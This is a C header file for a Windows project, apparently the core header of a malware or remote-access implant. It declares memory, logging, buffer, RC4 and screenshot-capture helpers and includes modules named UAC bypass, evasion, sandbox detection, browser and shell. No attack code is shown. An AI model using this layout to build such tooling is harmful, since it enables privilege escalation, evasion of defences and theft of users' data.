#pragma once

#define ALLOC(X) RtlAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, X)
#define FREE(X) FreeAllocatedHeap(X)
#define REALLOC(X, Y) RtlReAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, X, Y)
#define PTR_ADD_OFFSET(Pointer, Offset) ((PVOID)((ULONG_PTR)(Pointer) + (ULONG_PTR)(Offset)))
#define PTR_SUB_OFFSET(Pointer, Offset) ((PVOID)((ULONG_PTR)(Pointer) - (ULONG_PTR)(Offset)))
#define ALIGN_UP_BY(Address, Align) (((ULONG_PTR)(Address) + (Align) - 1) & ~((Align) - 1))
#define ALIGN_UP_POINTER_BY(Pointer, Align) ((PVOID)ALIGN_UP_BY(Pointer, Align))
#define ALIGN_UP(Address, Type) ALIGN_UP_BY(Address, sizeof(Type))
#define ALIGN_UP_POINTER(Pointer, Type) ((PVOID)ALIGN_UP(Pointer, Type))
#define ALIGN_DOWN_BY(Address, Align) ((ULONG_PTR)(Address) & ~((ULONG_PTR)(Align) - 1))
#define ALIGN_DOWN_POINTER_BY(Pointer, Align) ((PVOID)ALIGN_DOWN_BY(Pointer, Align))
#define ALIGN_DOWN(Address, Type) ALIGN_DOWN_BY(Address, sizeof(Type))
#define ALIGN_DOWN_POINTER(Pointer, Type) ((PVOID)ALIGN_DOWN(Pointer, Type))
#define LOG_ERROR(F, E) LogError(L"%s.%d: %s failed at %s (Error: 0x%08x)\n", PathFindFileNameW(__FILEW__), __LINE__, L ## F, __FUNCTIONW__, E);
#define FILETIME_TO_UNIXTIME(ft) (UINT)((*(LONGLONG*)&(ft)-116444736000000000)/10000000)
#define FILETIME_TO_UNIXMICRO(ft) (UINT64)((ft-116444736000000000)/10)


#include "Macros.h"
#include "Crt.h"
#include "Filesystem.h"
#include "Process.h"
#include "Random.h"
#include "Gui.h"
#include "Wmi.h"
#include "ScheduledTask.h"
#include "StringHelper.h"
#include "Time.h"
#include "Cryptography.h"
#include "Hash.h"
#include "Curve25519.h"
#include "UACBypass.h"
#include "SystemInfo.h"
#include "Service.h"
#include "Registry.h"
#include "Protobuf.h"
#include "Image.h"
#include "Network.h"
#include "LLVM.h"
#include "Evasion.h"
#include "Otp.h"
#include "Browser.h"
#include "SandboxDetection.h"
#include "7z.h"
#include "Runtime.h"
#include "Shell.h"

VOID HexDump
(
	_In_ PBYTE pBuffer,
	_In_ DWORD cbBuffer
);

VOID LogError
(
	_In_ LPWSTR lpFormat,
	...
);

VOID PrintStackTrace
(
	_In_ PCONTEXT pContext
);

LPSTR CreateFormattedErr
(
	_In_ DWORD dwErrCode,
	_In_ LPSTR lpFormat,
	...
);

LPSTR FormatErrorCode
(
	_In_ DWORD dwErrorCode
);

BOOL Unzip
(
	_In_ LPWSTR lpZipPath,
	_In_ LPWSTR lpOutputPath
);

BOOL CompressPathByGzip
(
	_In_ LPWSTR lpPath,
	_In_ LPWSTR lpOutputPath
);

LPSTR GenerateUUIDv4(VOID);

PBUFFER BufferInit
(
	_In_ PBYTE pBuffer,
	_In_ DWORD cbBuffer
);

PBUFFER BufferMove
(
	_In_ PBYTE pBuffer,
	_In_ DWORD cbBuffer
);

PBUFFER BufferEmpty
(
	_In_ DWORD cbBuffer
);

VOID FreeAllocatedHeap
(
	_In_ LPVOID lpBuffer
);

PBUFFER CaptureDesktop
(
	_In_ HDC hDC,
	_In_ DWORD dwX,
	_In_ DWORD dwY
);

VOID Rc4EncryptDecrypt
(
	_In_  PBYTE  pbBuffer,
	_In_  DWORD  dwSize,
	_In_  PBYTE  pbKey,
	_In_  DWORD  dwKeySize
);

VOID PrintFormatA
(
	_In_ LPSTR lpFormat,
	...
);

VOID PrintFormatW
(
	_In_ LPWSTR lpFormat,
	...
);